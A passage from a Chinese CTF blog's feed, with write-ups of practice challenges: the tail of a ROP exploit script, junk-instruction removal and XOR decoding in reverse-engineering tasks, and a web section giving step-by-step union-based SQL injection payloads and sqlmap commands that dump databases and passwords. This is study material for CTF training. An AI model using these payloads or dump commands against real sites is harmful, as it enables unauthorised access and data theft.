class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000450860</span>) <span class="comment"># add rax, 1 ; ret</span></span><br><span class="line">p += pack(<span class="string">&#x27;&lt;Q&#x27;</span>, <span class="number">0x0000000000401243</span>) <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">pl.sendline(p)</span><br><span class="line"></span><br><span class="line">pl.interactive()</span><br></pre></td></tr></table></figure><h3 id="WEEK1-babystack"><a href="#WEEK1-babystack" class="headerlink" title="[WEEK1]babystack"></a>[WEEK1]babystack</h3>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;RE&quot;&gt;&lt;a href=&quot;#RE&quot; class=&quot;headerlink&quot; title=&quot;RE&quot;&gt;&lt;/a&gt;RE&lt;/h2&gt;&lt;h3 id=&quot;WEEK1-ez-asm&quot;&gt;&lt;a href=&quot;#WEEK1-ez-asm&quot; class=&quot;headerlink&quot; title=&quot;[WEEK1]ez_asm&quot;&gt;&lt;/a&gt;[WEEK1]ez_asm&lt;/h3&gt;&lt;p&gt;简单的asm代码，直接对照的逻辑逆向即可&lt;/p&gt;
&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;flag = &lt;span class=&quot;string&quot;&gt;&amp;quot;nhuo[M`7mc7uhc$7midgbTf`7`$7%#ubf7 ci5Y&amp;quot;&lt;/span&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; i &lt;span class=&quot;keyword&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;built_in&quot;&gt;range&lt;/span&gt;(&lt;span class=&quot;built_in&quot;&gt;len&lt;/span&gt;(flag)):&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  c = flag[i] &lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  c = &lt;span class=&quot;built_in&quot;&gt;ord&lt;/span&gt;(c)+&lt;span class=&quot;number&quot;&gt;0xA&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  flag = flag[:i] + &lt;span class=&quot;built_in&quot;&gt;chr&lt;/span&gt;(c) + flag[i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  c = flag[i]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  c = &lt;span class=&quot;built_in&quot;&gt;ord&lt;/span&gt;(c)^&lt;span class=&quot;number&quot;&gt;0x1E&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;  flag = flag[:i] + &lt;span class=&quot;built_in&quot;&gt;chr&lt;/span&gt;(c) + flag[i+&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;:]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;built_in&quot;&gt;print&lt;/span&gt;(flag)&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>re做题记录</title>
    <link href="https://wuming.github.io/2023/09/23/re%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://wuming.github.io/2023/09/23/re%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</id>
    <published>2023-09-23T07:26:20.000Z</published>
    <updated>2023-12-18T05:33:25.767Z</updated>
    
    <content type="html"><![CDATA[<h1 id="花指令"><a href="#花指令" class="headerlink" title="花指令"></a>花指令</h1><p><a href="https://blog.csdn.net/Captain_RB/article/details/123858864">花指令总结_Captain_RB的博客-CSDN博客</a></p><h2 id="NSSRound-3-Team-jump-by-jump"><a href="#NSSRound-3-Team-jump-by-jump" class="headerlink" title="[NSSRound#3 Team]jump_by_jump"></a>[NSSRound#3 Team]jump_by_jump</h2><p>[<a href="https://www.nssctf.cn/problem/2313">NSSRound#3 Team]jump_by_jump | NSSCTF</a></p><p>为什么记录这个题目时因为他有花指令，是最简单的花指令</p><p>首先我们使用ida打开，我们可以看到他的主函数里调用了flag函数，但是不显示，我们切换视图发现是有花指令导致他无法编译</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.l5jcce610eo.webp"></p><p>我们看到他的特征就想到了多字节指令，我们在41188C(call或者jmp等等跳转函数)处，摁D将其转换成数据，将E8 nop 掉</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6qkaosh9hjk0.webp"></p><p>同时我们发现有很多变成了黄色的代码，我们一路对这些黄色的代码摁c将其转换成代码，最后我们可以选中全部的代码，摁d转换成数据，摁c转换成代码，最后摁p再编译成函数，就去掉了这类最简单的花指令，在函数内我们就发现了flag</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3x3dpjarkq60.webp"></p><span id="more"></span> <h2 id="HNCTF-2022-WEEK2-e-sy-flower"><a href="#HNCTF-2022-WEEK2-e-sy-flower" class="headerlink" title="[HNCTF 2022 WEEK2]e@sy_flower"></a>[HNCTF 2022 WEEK2]e@sy_flower</h2><p>第二个简单的去花题目</p><p>找到主函数后发现有花的地方</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.44rklresz740.webp"></p><p>我们在这里找到了花指令的地方，我们直接右击选择patching-&gt;change byte</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.50qing3en4o0.webp"></p><p>我们把E9-&gt;90 ,把E9nop掉，然后在main上p一下编译函数就可以了</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.4saybtma0gs0.webp"></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v3; <span class="comment">// kr00_4</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// cl</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> j; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v8; <span class="comment">// [esp+0h] [ebp-44h]</span></span><br><span class="line">  <span class="type">char</span> v9; <span class="comment">// [esp+0h] [ebp-44h]</span></span><br><span class="line">  <span class="type">char</span> Arglist[<span class="number">48</span>]; <span class="comment">// [esp+10h] [ebp-34h] BYREF</span></span><br><span class="line"></span><br><span class="line">  sub_401020(<span class="string">&quot;please input flag\n&quot;</span>, v8);</span><br><span class="line">  sub_401050(<span class="string">&quot;%s&quot;</span>, (<span class="type">char</span>)Arglist);</span><br><span class="line">  v3 = <span class="built_in">strlen</span>(Arglist);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v3 / <span class="number">2</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    v5 = Arglist[<span class="number">2</span> * i];</span><br><span class="line">    Arglist[<span class="number">2</span> * i] = Arglist[<span class="number">2</span> * i + <span class="number">1</span>];</span><br><span class="line">    Arglist[<span class="number">2</span> * i + <span class="number">1</span>] = v5;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt; <span class="built_in">strlen</span>(Arglist); ++j )</span><br><span class="line">    Arglist[j] ^= <span class="number">0x30</span>u;</span><br><span class="line">  v7 = <span class="built_in">strcmp</span>(Arglist, <span class="string">&quot;c~scvdzKCEoDEZ[^roDICUMC&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v7 )</span><br><span class="line">    v7 = v7 &lt; <span class="number">0</span> ? <span class="number">-1</span> : <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !v7 )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_401020(<span class="string">&quot;yes&quot;</span>, v9);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_401020(<span class="string">&quot;error&quot;</span>, v9);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们分析代码就可以知道，我们已知了加密后的代码，先异或回数据，然后根据前面的替换</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3qj9ibdwap80.webp"></p><p>然后根据上面解出来的数据再写代码进行替换位置</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="string">&#x27;SNCSFTJ&#123;su_tujknB_tyse&#125;s&#x27;</span></span><br><span class="line">secret=<span class="built_in">list</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">12</span>):</span><br><span class="line">  deme=secret[<span class="number">2</span>*i+<span class="number">1</span>]</span><br><span class="line">  secret[<span class="number">2</span>*i+<span class="number">1</span>] = secret[<span class="number">2</span>*i]</span><br><span class="line">  secret[<span class="number">2</span>*i]=deme</span><br><span class="line"></span><br><span class="line">result=<span class="string">&#x27;&#x27;</span>.join(secret)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(result,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># NSSCTF&#123;Just_junk_Bytess&#125;</span></span><br></pre></td></tr></table></figure><h2 id="SWPUCTF-2021-新生赛-easyapp"><a href="#SWPUCTF-2021-新生赛-easyapp" class="headerlink" title="[SWPUCTF 2021 新生赛]easyapp"></a>[SWPUCTF 2021 新生赛]easyapp</h2><p>首先先把附件改成zip后缀进行解压，解压完成后直接使用jadx打开直接找到主函数进行分析</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.5lfec6bnq680.webp"></p><p>我们可以看到这段是主要的函数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="comment">/* synthetic */</span> <span class="keyword">void</span> lambda$onCreate$<span class="number">0</span>$MainActivity(<span class="keyword">final</span> EditText editText, View v) &#123;</span><br><span class="line">        System.out.println(encoder.encode(editText.getText().toString()));</span><br><span class="line">        <span class="keyword">if</span> (encoder.encode(editText.getText().toString()).equals(<span class="string">&quot;棿棢棢棲棥棷棊棐棁棚棨棨棵棢棌&quot;</span>)) &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;YES&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Toast.makeText(<span class="built_in">this</span>, <span class="string">&quot;NO&quot;</span>, <span class="number">0</span>).show();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前面引进了两个函数，我们挨个查看一下</p><p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.1cftb7q0szxc.webp"></p><p>我们可以看到第一个加密函数，使用了key为123456789，然后和输入的内容进行异或</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ilililililil;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Encoder</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">key</span> <span class="operator">=</span> <span class="number">123456789</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">encode</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">char</span> c : str.toCharArray()) &#123;</span><br><span class="line">            sb.append((<span class="type">char</span>) (c ^ <span class="built_in">this</span>.key));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sb.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们看一下下一个函数。这里就是一个坑，他把第一个函数中的key值改成了987654321，所以后面异或的key为987654321</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.example.ilililililil;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* loaded from: classes.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActlvity</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MainActlvity</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Field</span> <span class="variable">declaredField</span> <span class="operator">=</span> Encoder.class.getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">            declaredField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">            declaredField.set(MainActivity.encoder, <span class="number">987654321</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IllegalAccessException | NoSuchFieldException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到现在我们已经知道了异或的key以及密文，所以我们就可以直接写脚本解题目了</p><p>当然注意一个很关键的地方因为他的apk使用的unicode编码，但我们ascii码的表示范围是0x0-0xFF，所以到最后我们需要异或一个255或者0xff表示范围</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">code=<span class="string">&#x27;棿棢棢棲棥棷棊棐棁棚棨棨棵棢棌&#x27;</span></span><br><span class="line">key = <span class="number">987654321</span></span><br><span class="line">flag=<span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> code:</span><br><span class="line">  flag+=<span class="built_in">chr</span>((<span class="built_in">ord</span>(i)^key)%<span class="number">128</span>) <span class="comment">#确定在0~128</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="comment"># NSSCTF&#123;apkYYDS&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;花指令&quot;&gt;&lt;a href=&quot;#花指令&quot; class=&quot;headerlink&quot; title=&quot;花指令&quot;&gt;&lt;/a&gt;花指令&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/Captain_RB/article/details/123858864&quot;&gt;花指令总结_Captain_RB的博客-CSDN博客&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;NSSRound-3-Team-jump-by-jump&quot;&gt;&lt;a href=&quot;#NSSRound-3-Team-jump-by-jump&quot; class=&quot;headerlink&quot; title=&quot;[NSSRound#3 Team]jump_by_jump&quot;&gt;&lt;/a&gt;[NSSRound#3 Team]jump_by_jump&lt;/h2&gt;&lt;p&gt;[&lt;a href=&quot;https://www.nssctf.cn/problem/2313&quot;&gt;NSSRound#3 Team]jump_by_jump | NSSCTF&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;为什么记录这个题目时因为他有花指令，是最简单的花指令&lt;/p&gt;
&lt;p&gt;首先我们使用ida打开，我们可以看到他的主函数里调用了flag函数，但是不显示，我们切换视图发现是有花指令导致他无法编译&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.l5jcce610eo.webp&quot;&gt;&lt;/p&gt;
&lt;p&gt;我们看到他的特征就想到了多字节指令，我们在41188C(call或者jmp等等跳转函数)处，摁D将其转换成数据，将E8 nop 掉&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.6qkaosh9hjk0.webp&quot;&gt;&lt;/p&gt;
&lt;p&gt;同时我们发现有很多变成了黄色的代码，我们一路对这些黄色的代码摁c将其转换成代码，最后我们可以选中全部的代码，摁d转换成数据，摁c转换成代码，最后摁p再编译成函数，就去掉了这类最简单的花指令，在函数内我们就发现了flag&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/image.3x3dpjarkq60.webp&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="ctf" scheme="https://wuming.github.io/tags/ctf/"/>
    
    <category term="re" scheme="https://wuming.github.io/tags/re/"/>
    
  </entry>
  
  <entry>
    <title>web入门记录</title>
    <link href="https://wuming.github.io/2023/09/21/web%E5%85%A5%E9%97%A8%E8%AE%B0%E5%BD%95/"/>
    <id>https://wuming.github.io/2023/09/21/web%E5%85%A5%E9%97%A8%E8%AE%B0%E5%BD%95/</id>
    <published>2023-09-21T05:45:27.000Z</published>
    <updated>2023-12-18T05:33:32.691Z</updated>
    
    <content type="html"><![CDATA[<p><img src="https://cdn.statically.io/gh/shenshuoyaoyouguangha/blogimg@main/202308172151534.jpg"></p><span id="more"></span> <h2 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h2><p><a href="https://blog.csdn.net/A951860555/article/details/116484328">SQL注入的一般过程_sql注入过程___lifanxin的博客-CSDN博客</a></p><p><a href="">浅谈SQL注入中的-1‘ union select 1,2,3#_娄不夜的博客-CSDN博客</a></p><p>SQL中的select语句，select语句是SQL中的查询语句，用于从数据库中查询数据，并且返回给用户。<br>它的简单用法是这样的：<strong>select 字段名1,字段名2…字段名n from</strong> 表名当然，你也可以同时指定数据库名及表名，具体用法是用一个点号连接数据库名和表名，例子：select 字段名1,字段名2…字段名n from 数据库名.表名</p><p>联合查询：<br>    格式：<strong>select 字段名1,字段名2…字段名n from 表名1 union select 字段名1,字段名2…字段名n from 表名2</strong><br>    作用：联合查询用于合并两个或多个 SELECT 语句的结果集<br>    注意：</p><pre><code>    1. 每个 SELECT 语句必须拥有相同数量的列    2. 列必须拥有相似的数据类型（相似的意思是：有些数据类型间可以互相转化，比如数字字符串和数字。这就叫相似，相似就行，不是必须一模一样）    3. 每个 SELECT 语句中的列的顺序必须相同</code></pre><h2 id="手注："><a href="#手注：" class="headerlink" title="手注："></a>手注：</h2><p>记录一种做题方法</p><p>题目来源 Litctf sql注入</p><p>1.先判断显示位，payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-<span class="number">1</span>)))))) union select <span class="number">1</span>,<span class="number">2</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>2.爆库：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1)))))) and 1=2 union select 1,group_concat(schema_name) from information_schema.schemata#</span><br></pre></td></tr></table></figure><p>1&#x3D;2的目的是使得条件为假</p><p>3.得到库名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema,mysql,ctftraining,performance_schema,test,ctf</span><br></pre></td></tr></table></figure><p>4.爆表：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&quot;ctf&quot;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>5.得到表名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">users</span><br></pre></td></tr></table></figure><p>6.爆列：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(column_name)<span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&quot;users&quot;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>7.得到列名：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id,username,password,ip,time,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS,id,username,password</span><br></pre></td></tr></table></figure><p>8.获取值：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1)))))) and 1=2 union select 1,group_concat(password) from ctf.users#</span><br></pre></td></tr></table></figure><p>9.获得彩蛋（难蚌）：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">OHHHHHHH,F1rst_to_Th3_eggggggggg!&#125; </span><br></pre></td></tr></table></figure><p>flag同理，去爆ctftraining即可</p><p>10.重新爆表：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(table_name)<span class="keyword">from</span> information_schema.tables where table_schema=<span class="string">&quot;ctftraining&quot;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>11.得到表明：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag,news,users</span><br></pre></td></tr></table></figure><p>12.重新爆列：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(column_name)<span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&quot;flag&quot;</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>13.获得列名：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag</span><br></pre></td></tr></table></figure><p>14.重新获取值：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>)))))) <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> union select <span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(flag) <span class="keyword">from</span> ctftraining.flag<span class="comment">#</span></span><br></pre></td></tr></table></figure><h2 id="Sqlmap"><a href="#Sqlmap" class="headerlink" title="Sqlmap"></a>Sqlmap</h2><p>查询是否可以找到数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt</span><br></pre></td></tr></table></figure><p>查数据库</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt -dbs --batch</span><br></pre></td></tr></table></figure><p>查表</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt -D school -tables --batch</span><br></pre></td></tr></table></figure><p>查字段</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt  -D school -T students --columns --batch</span><br></pre></td></tr></table></figure><p>查数据</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 sqlmap.py -r 1.txt  -D school -T students -C name --dump --batch</span><br></pre></td></tr></table></figure><p>当请求延时的时候使用–delay 1</p><figure class="highlight plaintext"><table><tr><td 